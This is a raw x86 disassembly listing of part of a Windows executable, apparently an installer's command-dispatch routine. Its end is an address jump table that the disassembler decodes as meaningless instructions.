  402502:	e8 73 3a 00 00       	call   0x405f7a
  402507:	3b c3                	cmp    %ebx,%eax
  402509:	0f 84 3d 05 00 00    	je     0x402a4c
  40250f:	50                   	push   %eax
  402510:	e9 c9 f9 ff ff       	jmp    0x401ede
  402515:	6a ed                	push   $0xffffffed
  402517:	e8 a3 06 00 00       	call   0x402bbf
  40251c:	ff 75 dc             	push   -0x24(%ebp)
  40251f:	ff 75 d8             	push   -0x28(%ebp)
  402522:	50                   	push   %eax
  402523:	e8 c7 36 00 00       	call   0x405bef
  402528:	83 f8 ff             	cmp    $0xffffffff,%eax
  40252b:	0f 84 ea 02 00 00    	je     0x40281b
  402531:	50                   	push   %eax
  402532:	e9 2e f0 ff ff       	jmp    0x401565
  402537:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40253a:	33 c9                	xor    %ecx,%ecx
  40253c:	83 fa 38             	cmp    $0x38,%edx
  40253f:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402542:	0f 94 c1             	sete   %cl
  402545:	3b c3                	cmp    %ebx,%eax
  402547:	8b f9                	mov    %ecx,%edi
  402549:	74 17                	je     0x402562
  40254b:	6a 01                	push   $0x1
  40254d:	e8 50 06 00 00       	call   0x402ba2
  402552:	66 a3 a8 9d 40 00    	mov    %ax,0x409da8
  402558:	33 c0                	xor    %eax,%eax
  40255a:	3b fb                	cmp    %ebx,%edi
  40255c:	0f 94 c0             	sete   %al
  40255f:	40                   	inc    %eax
  402560:	eb 43                	jmp    0x4025a5
  402562:	83 fa 38             	cmp    $0x38,%edx
  402565:	75 2f                	jne    0x402596
  402567:	6a 21                	push   $0x21
  402569:	e8 51 06 00 00       	call   0x402bbf
  40256e:	53                   	push   %ebx
  40256f:	53                   	push   %ebx
  402570:	68 00 04 00 00       	push   $0x400
  402575:	68 a8 9d 40 00       	push   $0x409da8
  40257a:	6a ff                	push   $0xffffffff
  40257c:	68 a8 a5 40 00       	push   $0x40a5a8
  402581:	53                   	push   %ebx
  402582:	53                   	push   %ebx
  402583:	ff 15 60 71 40 00    	call   *0x407160
  402589:	68 a8 9d 40 00       	push   $0x409da8
  40258e:	ff 15 5c 71 40 00    	call   *0x40715c
  402594:	eb 0f                	jmp    0x4025a5
  402596:	6a 11                	push   $0x11
  402598:	e8 22 06 00 00       	call   0x402bbf
  40259d:	50                   	push   %eax
  40259e:	e8 8d 3a 00 00       	call   0x406030
  4025a3:	03 c0                	add    %eax,%eax
  4025a5:	66 39 1e             	cmp    %bx,(%esi)
  4025a8:	89 45 08             	mov    %eax,0x8(%ebp)
  4025ab:	0f 84 6d 02 00 00    	je     0x40281e
  4025b1:	56                   	push   %esi
  4025b2:	e8 c3 39 00 00       	call   0x405f7a
  4025b7:	0b 7d cc             	or     -0x34(%ebp),%edi
  4025ba:	8b f0                	mov    %eax,%esi
  4025bc:	75 14                	jne    0x4025d2
  4025be:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025c1:	74 0f                	je     0x4025d2
  4025c3:	56                   	push   %esi
  4025c4:	56                   	push   %esi
  4025c5:	e8 06 37 00 00       	call   0x405cd0
  4025ca:	85 c0                	test   %eax,%eax
  4025cc:	0f 8c 4c 02 00 00    	jl     0x40281e
  4025d2:	ff 75 08             	push   0x8(%ebp)
  4025d5:	68 a8 9d 40 00       	push   $0x409da8
  4025da:	56                   	push   %esi
  4025db:	e8 c1 36 00 00       	call   0x405ca1
  4025e0:	e9 c7 ef ff ff       	jmp    0x4015ac
  4025e5:	6a 02                	push   $0x2
  4025e7:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4025ea:	58                   	pop    %eax
  4025eb:	50                   	push   %eax
  4025ec:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4025ef:	e8 ae 05 00 00       	call   0x402ba2
  4025f4:	83 f8 01             	cmp    $0x1,%eax
  4025f7:	89 45 b8             	mov    %eax,-0x48(%ebp)
  4025fa:	0f 8c 4c 04 00 00    	jl     0x402a4c
  402600:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402605:	3b c1                	cmp    %ecx,%eax
  402607:	7e 03                	jle    0x40260c
  402609:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  40260c:	66 39 1e             	cmp    %bx,(%esi)
  40260f:	0f 84 5e 01 00 00    	je     0x402773
  402615:	56                   	push   %esi
  402616:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402619:	e8 5c 39 00 00       	call   0x405f7a
  40261e:	39 5d b8             	cmp    %ebx,-0x48(%ebp)
  402621:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402624:	0f 8e 49 01 00 00    	jle    0x402773
  40262a:	8b 3d 58 71 40 00    	mov    0x407158,%edi
  402630:	83 7d d0 39          	cmpl   $0x39,-0x30(%ebp)
  402634:	0f 85 8f 00 00 00    	jne    0x4026c9
  40263a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40263d:	53                   	push   %ebx
  40263e:	50                   	push   %eax
  40263f:	6a 02                	push   $0x2
  402641:	58                   	pop    %eax
  402642:	2b 45 e0             	sub    -0x20(%ebp),%eax
  402645:	50                   	push   %eax
  402646:	8d 45 0a             	lea    0xa(%ebp),%eax
  402649:	50                   	push   %eax
  40264a:	ff 75 ec             	push   -0x14(%ebp)
  40264d:	ff 15 4c 71 40 00    	call   *0x40714c
  402653:	85 c0                	test   %eax,%eax
  402655:	0f 84 18 01 00 00    	je     0x402773
  40265b:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40265e:	3b cb                	cmp    %ebx,%ecx
  402660:	0f 84 0d 01 00 00    	je     0x402773
  402666:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  40266b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40266e:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402671:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402674:	0f 85 b5 00 00 00    	jne    0x40272f
  40267a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40267d:	6a 01                	push   $0x1
  40267f:	50                   	push   %eax
  402680:	8d 45 0a             	lea    0xa(%ebp),%eax
  402683:	51                   	push   %ecx
  402684:	50                   	push   %eax
  402685:	6a 08                	push   $0x8
  402687:	53                   	push   %ebx
  402688:	ff d7                	call   *%edi
  40268a:	85 c0                	test   %eax,%eax
  40268c:	75 68                	jne    0x4026f6
  40268e:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  402691:	f7 de                	neg    %esi
  402693:	ff 4d c8             	decl   -0x38(%ebp)
  402696:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  40269b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40269e:	74 59                	je     0x4026f9
  4026a0:	ff 4d c4             	decl   -0x3c(%ebp)
  4026a3:	46                   	inc    %esi
  4026a4:	6a 01                	push   $0x1
  4026a6:	53                   	push   %ebx
  4026a7:	56                   	push   %esi
  4026a8:	ff 75 ec             	push   -0x14(%ebp)
  4026ab:	ff 15 48 71 40 00    	call   *0x407148
  4026b1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4026b4:	6a 01                	push   $0x1
  4026b6:	50                   	push   %eax
  4026b7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4026ba:	ff 75 c8             	push   -0x38(%ebp)
  4026bd:	50                   	push   %eax
  4026be:	6a 08                	push   $0x8
  4026c0:	53                   	push   %ebx
  4026c1:	ff d7                	call   *%edi
  4026c3:	85 c0                	test   %eax,%eax
  4026c5:	74 cc                	je     0x402693
  4026c7:	eb 2d                	jmp    0x4026f6
  4026c9:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4026cc:	75 16                	jne    0x4026e4
  4026ce:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  4026d1:	75 11                	jne    0x4026e4
  4026d3:	53                   	push   %ebx
  4026d4:	ff 75 ec             	push   -0x14(%ebp)
  4026d7:	e8 f4 35 00 00       	call   0x405cd0
  4026dc:	85 c0                	test   %eax,%eax
  4026de:	0f 8c 8f 00 00 00    	jl     0x402773
  4026e4:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4026e7:	6a 02                	push   $0x2
  4026e9:	50                   	push   %eax
  4026ea:	ff 75 ec             	push   -0x14(%ebp)
  4026ed:	e8 80 35 00 00       	call   0x405c72
  4026f2:	85 c0                	test   %eax,%eax
  4026f4:	74 7d                	je     0x402773
  4026f6:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4026f9:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4026fc:	75 31                	jne    0x40272f
  4026fe:	66 83 7d f8 0d       	cmpw   $0xd,-0x8(%ebp)
  402703:	74 3b                	je     0x402740
  402705:	66 83 7d f8 0a       	cmpw   $0xa,-0x8(%ebp)
  40270a:	74 34                	je     0x402740
  40270c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40270f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402712:	ff 45 f4             	incl   -0xc(%ebp)
  402715:	66 3b c3             	cmp    %bx,%ax
  402718:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  40271c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40271f:	74 52                	je     0x402773
  402721:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402724:	3b 45 b8             	cmp    -0x48(%ebp),%eax
  402727:	0f 8c 03 ff ff ff    	jl     0x402630
  40272d:	eb 44                	jmp    0x402773
  40272f:	0f b7 c0             	movzwl %ax,%eax
  402732:	50                   	push   %eax
  402733:	ff 75 f0             	push   -0x10(%ebp)
  402736:	e8 26 38 00 00       	call   0x405f61
  40273b:	e9 15 03 00 00       	jmp    0x402a55
  402740:	66 39 45 f8          	cmp    %ax,-0x8(%ebp)
  402744:	74 1b                	je     0x402761
  402746:	66 3d 0d 00          	cmp    $0xd,%ax
  40274a:	74 06                	je     0x402752
  40274c:	66 3d 0a 00          	cmp    $0xa,%ax
  402750:	75 0f                	jne    0x402761
  402752:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402755:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402758:	ff 45 f4             	incl   -0xc(%ebp)
  40275b:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  40275f:	eb 12                	jmp    0x402773
  402761:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402764:	6a 01                	push   $0x1
  402766:	f7 d8                	neg    %eax
  402768:	53                   	push   %ebx
  402769:	50                   	push   %eax
  40276a:	ff 75 ec             	push   -0x14(%ebp)
  40276d:	ff 15 48 71 40 00    	call   *0x407148
  402773:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402776:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402779:	3b c3                	cmp    %ebx,%eax
  40277b:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  40277f:	e9 2a ee ff ff       	jmp    0x4015ae
  402784:	66 39 1e             	cmp    %bx,(%esi)
  402787:	0f 84 bf 02 00 00    	je     0x402a4c
  40278d:	ff 75 e0             	push   -0x20(%ebp)
  402790:	53                   	push   %ebx
  402791:	6a 02                	push   $0x2
  402793:	e8 0a 04 00 00       	call   0x402ba2
  402798:	50                   	push   %eax
  402799:	56                   	push   %esi
  40279a:	e8 db 37 00 00       	call   0x405f7a
  40279f:	50                   	push   %eax
  4027a0:	ff 15 48 71 40 00    	call   *0x407148
  4027a6:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4027a9:	0f 8c 9d 02 00 00    	jl     0x402a4c
  4027af:	e9 3a 02 00 00       	jmp    0x4029ee
  4027b4:	56                   	push   %esi
  4027b5:	e8 c0 37 00 00       	call   0x405f7a
  4027ba:	3b c3                	cmp    %ebx,%eax
  4027bc:	0f 84 8a 02 00 00    	je     0x402a4c
  4027c2:	50                   	push   %eax
  4027c3:	ff 15 50 71 40 00    	call   *0x407150
  4027c9:	e9 7e 02 00 00       	jmp    0x402a4c
  4027ce:	ff 75 f0             	push   -0x10(%ebp)
  4027d1:	e8 a4 37 00 00       	call   0x405f7a
  4027d6:	3b c3                	cmp    %ebx,%eax
  4027d8:	74 12                	je     0x4027ec
  4027da:	8d 8d 50 fd ff ff    	lea    -0x2b0(%ebp),%ecx
  4027e0:	51                   	push   %ecx
  4027e1:	50                   	push   %eax
  4027e2:	ff 15 40 71 40 00    	call   *0x407140
  4027e8:	85 c0                	test   %eax,%eax
  4027ea:	75 47                	jne    0x402833
  4027ec:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4027f3:	66 89 1e             	mov    %bx,(%esi)
  4027f6:	e9 51 02 00 00       	jmp    0x402a4c
  4027fb:	6a 02                	push   $0x2
  4027fd:	e8 bd 03 00 00       	call   0x402bbf
  402802:	8d 8d 50 fd ff ff    	lea    -0x2b0(%ebp),%ecx
  402808:	51                   	push   %ecx
  402809:	50                   	push   %eax
  40280a:	ff 15 3c 71 40 00    	call   *0x40713c
  402810:	83 f8 ff             	cmp    $0xffffffff,%eax
  402813:	75 15                	jne    0x40282a
  402815:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402818:	66 89 18             	mov    %bx,(%eax)
  40281b:	66 89 1e             	mov    %bx,(%esi)
  40281e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402825:	e9 22 02 00 00       	jmp    0x402a4c
  40282a:	50                   	push   %eax
  40282b:	ff 75 f0             	push   -0x10(%ebp)
  40282e:	e8 2e 37 00 00       	call   0x405f61
  402833:	8d 85 7c fd ff ff    	lea    -0x284(%ebp),%eax
  402839:	50                   	push   %eax
  40283a:	56                   	push   %esi
  40283b:	e9 30 01 00 00       	jmp    0x402970
  402840:	6a f0                	push   $0xfffffff0
  402842:	c7 45 b8 66 fd ff ff 	movl   $0xfffffd66,-0x48(%ebp)
  402849:	e8 71 03 00 00       	call   0x402bbf
  40284e:	8b f0                	mov    %eax,%esi
  402850:	56                   	push   %esi
  402851:	89 75 c8             	mov    %esi,-0x38(%ebp)
  402854:	e8 ec 31 00 00       	call   0x405a45
  402859:	85 c0                	test   %eax,%eax
  40285b:	75 07                	jne    0x402864
  40285d:	6a ed                	push   $0xffffffed
  40285f:	e8 5b 03 00 00       	call   0x402bbf
  402864:	56                   	push   %esi
  402865:	e8 60 33 00 00       	call   0x405bca
  40286a:	6a 02                	push   $0x2
  40286c:	68 00 00 00 40       	push   $0x40000000
  402871:	56                   	push   %esi
  402872:	e8 78 33 00 00       	call   0x405bef
  402877:	83 f8 ff             	cmp    $0xffffffff,%eax
  40287a:	89 45 08             	mov    %eax,0x8(%ebp)
  40287d:	0f 84 97 00 00 00    	je     0x40291a
  402883:	a1 14 92 42 00       	mov    0x429214,%eax
  402888:	8b 35 0c 71 40 00    	mov    0x40710c,%esi
  40288e:	50                   	push   %eax
  40288f:	6a 40                	push   $0x40
  402891:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402894:	ff d6                	call   *%esi
  402896:	8b f8                	mov    %eax,%edi
  402898:	3b fb                	cmp    %ebx,%edi
  40289a:	74 75                	je     0x402911
  40289c:	53                   	push   %ebx
  40289d:	e8 80 09 00 00       	call   0x403222
  4028a2:	ff 75 f8             	push   -0x8(%ebp)
  4028a5:	57                   	push   %edi
  4028a6:	e8 61 09 00 00       	call   0x40320c
  4028ab:	ff 75 dc             	push   -0x24(%ebp)
  4028ae:	6a 40                	push   $0x40
  4028b0:	ff d6                	call   *%esi
  4028b2:	8b f0                	mov    %eax,%esi
  4028b4:	3b f3                	cmp    %ebx,%esi
  4028b6:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4028b9:	74 34                	je     0x4028ef
  4028bb:	ff 75 dc             	push   -0x24(%ebp)
  4028be:	56                   	push   %esi
  4028bf:	53                   	push   %ebx
  4028c0:	ff 75 d8             	push   -0x28(%ebp)
  4028c3:	e8 5f 07 00 00       	call   0x403027
  4028c8:	eb 18                	jmp    0x4028e2
  4028ca:	8b 0e                	mov    (%esi),%ecx
  4028cc:	8b 46 04             	mov    0x4(%esi),%eax
  4028cf:	83 c6 08             	add    $0x8,%esi
  4028d2:	51                   	push   %ecx
  4028d3:	03 c7                	add    %edi,%eax
  4028d5:	56                   	push   %esi
  4028d6:	50                   	push   %eax
  4028d7:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  4028da:	e8 cb 32 00 00       	call   0x405baa
  4028df:	03 75 b4             	add    -0x4c(%ebp),%esi
  4028e2:	38 1e                	cmp    %bl,(%esi)
  4028e4:	75 e4                	jne    0x4028ca
  4028e6:	ff 75 cc             	push   -0x34(%ebp)
  4028e9:	ff 15 08 71 40 00    	call   *0x407108
  4028ef:	ff 75 f8             	push   -0x8(%ebp)
  4028f2:	57                   	push   %edi
  4028f3:	ff 75 08             	push   0x8(%ebp)
  4028f6:	e8 a6 33 00 00       	call   0x405ca1
  4028fb:	57                   	push   %edi
  4028fc:	ff 15 08 71 40 00    	call   *0x407108
  402902:	53                   	push   %ebx
  402903:	53                   	push   %ebx
  402904:	ff 75 08             	push   0x8(%ebp)
  402907:	6a ff                	push   $0xffffffff
  402909:	e8 19 07 00 00       	call   0x403027
  40290e:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402911:	ff 75 08             	push   0x8(%ebp)
  402914:	ff 15 20 71 40 00    	call   *0x407120
  40291a:	39 5d b8             	cmp    %ebx,-0x48(%ebp)
  40291d:	6a f3                	push   $0xfffffff3
  40291f:	5e                   	pop    %esi
  402920:	7d 13                	jge    0x402935
  402922:	6a ef                	push   $0xffffffef
  402924:	5e                   	pop    %esi
  402925:	ff 75 c8             	push   -0x38(%ebp)
  402928:	ff 15 44 71 40 00    	call   *0x407144
  40292e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402935:	56                   	push   %esi
  402936:	e9 a1 f8 ff ff       	jmp    0x4021dc
  40293b:	53                   	push   %ebx
  40293c:	e8 61 02 00 00       	call   0x402ba2
  402941:	8b f8                	mov    %eax,%edi
  402943:	3b 3d 2c 92 42 00    	cmp    0x42922c,%edi
  402949:	0f 83 cf fe ff ff    	jae    0x40281e
  40294f:	8b f7                	mov    %edi,%esi
  402951:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402954:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  40295a:	03 35 28 92 42 00    	add    0x429228,%esi
  402960:	3b c3                	cmp    %ebx,%eax
  402962:	7c 19                	jl     0x40297d
  402964:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402967:	75 11                	jne    0x40297a
  402969:	83 c6 18             	add    $0x18,%esi
  40296c:	56                   	push   %esi
  40296d:	ff 75 f0             	push   -0x10(%ebp)
  402970:	e8 a5 36 00 00       	call   0x40601a
  402975:	e9 d2 00 00 00       	jmp    0x402a4c
  40297a:	51                   	push   %ecx
  40297b:	eb 72                	jmp    0x4029ef
  40297d:	83 c9 ff             	or     $0xffffffff,%ecx
  402980:	2b c8                	sub    %eax,%ecx
  402982:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  402985:	74 0c                	je     0x402993
  402987:	6a 01                	push   $0x1
  402989:	e8 14 02 00 00       	call   0x402ba2
  40298e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402991:	eb 10                	jmp    0x4029a3
  402993:	ff 75 e4             	push   -0x1c(%ebp)
  402996:	8d 46 18             	lea    0x18(%esi),%eax
  402999:	50                   	push   %eax
  40299a:	e8 9d 36 00 00       	call   0x40603c
  40299f:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  4029a3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4029a6:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4029a9:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4029ac:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4029af:	0f 84 97 00 00 00    	je     0x402a4c
  4029b5:	57                   	push   %edi
  4029b6:	e8 c2 e7 ff ff       	call   0x40117d
  4029bb:	e9 8c 00 00 00       	jmp    0x402a4c
  4029c0:	53                   	push   %ebx
  4029c1:	e8 dc 01 00 00       	call   0x402ba2
  4029c6:	83 f8 20             	cmp    $0x20,%eax
  4029c9:	0f 83 4f fe ff ff    	jae    0x40281e
  4029cf:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4029d2:	74 25                	je     0x4029f9
  4029d4:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4029d7:	74 0f                	je     0x4029e8
  4029d9:	50                   	push   %eax
  4029da:	e8 ba e8 ff ff       	call   0x401299
  4029df:	53                   	push   %ebx
  4029e0:	53                   	push   %ebx
  4029e1:	e8 09 e8 ff ff       	call   0x4011ef
  4029e6:	eb 64                	jmp    0x402a4c
  4029e8:	53                   	push   %ebx
  4029e9:	e8 f4 e8 ff ff       	call   0x4012e2
  4029ee:	50                   	push   %eax
  4029ef:	ff 75 f0             	push   -0x10(%ebp)
  4029f2:	e8 6a 35 00 00       	call   0x405f61
  4029f7:	eb 53                	jmp    0x402a4c
  4029f9:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4029fc:	74 12                	je     0x402a10
  4029fe:	8b 15 10 92 42 00    	mov    0x429210,%edx
  402a04:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402a07:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402a0e:	eb 3c                	jmp    0x402a4c
  402a10:	8b 0d 10 92 42 00    	mov    0x429210,%ecx
  402a16:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402a1d:	ff 75 f0             	push   -0x10(%ebp)
  402a20:	e8 17 36 00 00       	call   0x40603c
  402a25:	eb 25                	jmp    0x402a4c
  402a27:	8b 0d e8 46 42 00    	mov    0x4246e8,%ecx
  402a2d:	53                   	push   %ebx
  402a2e:	23 c8                	and    %eax,%ecx
  402a30:	51                   	push   %ecx
  402a31:	6a 0b                	push   $0xb
  402a33:	ff 75 f4             	push   -0xc(%ebp)
  402a36:	ff 15 20 72 40 00    	call   *0x407220
  402a3c:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  402a3f:	74 0b                	je     0x402a4c
  402a41:	53                   	push   %ebx
  402a42:	53                   	push   %ebx
  402a43:	ff 75 f4             	push   -0xc(%ebp)
  402a46:	ff 15 1c 72 40 00    	call   *0x40721c
  402a4c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a4f:	01 05 88 92 42 00    	add    %eax,0x429288
  402a55:	33 c0                	xor    %eax,%eax
  402a57:	5f                   	pop    %edi
  402a58:	5e                   	pop    %esi
  402a59:	5b                   	pop    %ebx
  402a5a:	c9                   	leave
  402a5b:	c2 04 00             	ret    $0x4
  402a5e:	57                   	push   %edi
  402a5f:	2a 40 00             	sub    0x0(%eax),%al
  402a62:	91                   	xchg   %eax,%ecx
  402a63:	14 40                	adc    $0x40,%al
  402a65:	00 9d 14 40 00 b8    	add    %bl,-0x47ffbfec(%ebp)
  402a6b:	14 40                	adc    $0x40,%al
  402a6d:	00 cb                	add    %cl,%bl
  402a6f:	14 40                	adc    $0x40,%al
  402a71:	00 d7                	add    %dl,%bh
  402a73:	14 40                	adc    $0x40,%al
  402a75:	00 f1                	add    %dh,%cl
  402a77:	14 40                	adc    $0x40,%al
  402a79:	00 6b 15             	add    %ch,0x15(%ebx)
  402a7c:	40                   	inc    %eax
  402a7d:	00 9b 15 40 00 b9    	add    %bl,-0x46ffbfeb(%ebx)
  402a83:	15 40 00 62 16       	adc    $0x16620040,%eax
  402a88:	40                   	inc    %eax
  402a89:	00 ff                	add    %bh,%bh
  402a8b:	14 40                	adc    $0x40,%al
  402a8d:	00 3a                	add    %bh,(%edx)
  402a8f:	15 40 00 5b 15       	adc    $0x155b0040,%eax
  402a94:	40                   	inc    %eax
  402a95:	00 73 16             	add    %dh,0x16(%ebx)
  402a98:	40                   	inc    %eax
  402a99:	00 c4                	add    %al,%ah
  402a9b:	16                   	push   %ss
  402a9c:	40                   	inc    %eax
  402a9d:	00 2d 17 40 00 54    	add    %ch,0x54004017
  402aa3:	17                   	pop    %ss
  402aa4:	40                   	inc    %eax
  402aa5:	00 67 17             	add    %ah,0x17(%edi)
  402aa8:	40                   	inc    %eax
  402aa9:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402aac:	40                   	inc    %eax
  402aad:	00 07                	add    %al,(%edi)
  402aaf:	19 40 00             	sbb    %eax,0x0(%eax)
  402ab2:	39 19                	cmp    %ebx,(%ecx)
  402ab4:	40                   	inc    %eax
  402ab5:	00 4e 19             	add    %cl,0x19(%esi)
  402ab8:	40                   	inc    %eax
  402ab9:	00 60 19             	add    %ah,0x19(%eax)
  402abc:	40                   	inc    %eax
  402abd:	00 e4                	add    %ah,%ah
  402abf:	19 40 00             	sbb    %eax,0x0(%eax)
  402ac2:	15 1a 40 00 57       	adc    $0x5700401a,%eax
  402ac7:	1a 40 00             	sbb    0x0(%eax),%al
  402aca:	89 1a                	mov    %ebx,(%edx)
  402acc:	40                   	inc    %eax
  402acd:	00 16                	add    %dl,(%esi)
  402acf:	1b 40 00             	sbb    0x0(%eax),%eax
  402ad2:	37                   	aaa
  402ad3:	1b 40 00             	sbb    0x0(%eax),%eax
  402ad6:	df 1b                	fistps (%ebx)
  402ad8:	40                   	inc    %eax
  402ad9:	00 df                	add    %bl,%bh
  402adb:	1b 40 00             	sbb    0x0(%eax),%eax
  402ade:	a3 1c 40 00 c0       	mov    %eax,0xc000401c
  402ae3:	1c 40                	sbb    $0x40,%al
  402ae5:	00 db                	add    %bl,%bl
  402ae7:	1c 40                	sbb    $0x40,%al
  402ae9:	00 fa                	add    %bh,%dl
  402aeb:	1c 40                	sbb    $0x40,%al
  402aed:	00 56 1d             	add    %dl,0x1d(%esi)
  402af0:	40                   	inc    %eax
  402af1:	00 dc                	add    %bl,%ah
  402af3:	1d 40 00 08 1e       	sbb    $0x1e080040,%eax
  402af8:	40                   	inc    %eax
  402af9:	00 66 1e             	add    %ah,0x1e(%esi)
  402afc:	40                   	inc    %eax
  402afd:	00 e9                	add    %ch,%cl
  402aff:	1e                   	push   %ds
  402b00:	40                   	inc    %eax
  402b01:	00 1d 1f 40 00 c2    	add    %bl,0xc200401f
  402b07:	1f                   	pop    %ds
  402b08:	40                   	inc    %eax
  402b09:	00 95 20 40 00 ea    	add    %dl,-0x15ffbfe0(%ebp)
  402b0f:	21 40 00             	and    %eax,0x0(%eax)
  402b12:	6e                   	outsb  %ds:(%esi),(%dx)
  402b13:	22 40 00             	and    0x0(%eax),%al
  402b16:	9d                   	popf
  402b17:	22 40 00             	and    0x0(%eax),%al
  402b1a:	df 22                	fbld   (%edx)
  402b1c:	40                   	inc    %eax
  402b1d:	00 1f                	add    %bl,(%edi)
  402b1f:	23 40 00             	and    0x0(%eax),%eax
  402b22:	7b 23                	jnp    0x402b47
  402b24:	40                   	inc    %eax
  402b25:	00 2a                	add    %ch,(%edx)
  402b27:	24 40                	and    $0x40,%al
  402b29:	00 9e 24 40 00 01    	add    %bl,0x1004024(%esi)
  402b2f:	25 40 00 15 25       	and    $0x25150040,%eax
  402b34:	40                   	inc    %eax
  402b35:	00 37                	add    %dh,(%edi)
  402b37:	25 40 00 e5 25       	and    $0x25e50040,%eax
  402b3c:	40                   	inc    %eax
  402b3d:	00 84 27 40 00 b4 27 	add    %al,0x27b40040(%edi,%eiz,1)
  402b44:	40                   	inc    %eax
  402b45:	00 ce                	add    %cl,%dh
  402b47:	27                   	daa
  402b48:	40                   	inc    %eax
  402b49:	00 fb                	add    %bh,%bl
  402b4b:	27                   	daa
  402b4c:	40                   	inc    %eax
  402b4d:	00 40 28             	add    %al,0x28(%eax)
  402b50:	40                   	inc    %eax
  402b51:	00 3b                	add    %bh,(%ebx)
  402b53:	29 40 00             	sub    %eax,0x0(%eax)
  402b56:	c0 29 40             	shrb   $0x40,(%ecx)
  402b59:	00 4c 2a 40          	add    %cl,0x40(%edx,%ebp,1)
  402b5d:	00 4c 2a 40          	add    %cl,0x40(%edx,%ebp,1)
  402b61:	00 27                	add    %ah,(%edi)
  402b63:	2a 40 00             	sub    0x0(%eax),%al
  402b66:	37                   	aaa
  402b67:	25 40 00 e5 25       	and    $0x25e50040,%eax
  402b6c:	40                   	inc    %eax
  402b6d:	00 aa 1a 40 00 ae    	add    %ch,-0x51ffbfe6(%edx)
  402b73:	1a 40 00             	sbb    0x0(%eax),%al
  402b76:	b2 1a                	mov    $0x1a,%dl
  402b78:	40                   	inc    %eax
  402b79:	00 b9 1a 40 00 c6    	add    %bh,-0x39ffbfe6(%ecx)
  402b7f:	1a 40 00             	sbb    0x0(%eax),%al
  402b82:	ca 1a 40             	lret   $0x401a
  402b85:	00 ce                	add    %cl,%dh
  402b87:	1a 40 00             	sbb    0x0(%eax),%al
  402b8a:	d2 1a                	rcrb   %cl,(%edx)
  402b8c:	40                   	inc    %eax
  402b8d:	00 db                	add    %bl,%bl
  402b8f:	1a 40 00             	sbb    0x0(%eax),%al
  402b92:	e5 1a                	in     $0x1a,%eax
  402b94:	40                   	inc    %eax
  402b95:	00 f2                	add    %dh,%dl
  402b97:	1a 40 00             	sbb    0x0(%eax),%al
  402b9a:	0a 1b                	or     (%ebx),%bl
  402b9c:	40                   	inc    %eax
  402b9d:	00 0e                	add    %cl,(%esi)
  402b9f:	1b 40 00             	sbb    0x0(%eax),%eax
  402ba2:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ba6:	8b 0d a8 bd 40 00    	mov    0x40bda8,%ecx
  402bac:	ff 34 81             	push   (%ecx,%eax,4)
  402baf:	6a 00                	push   $0x0
  402bb1:	e8 86 34 00 00       	call   0x40603c
  402bb6:	50                   	push   %eax
  402bb7:	e8 be 33 00 00       	call   0x405f7a
  402bbc:	c2 04 00             	ret    $0x4
  402bbf:	56                   	push   %esi
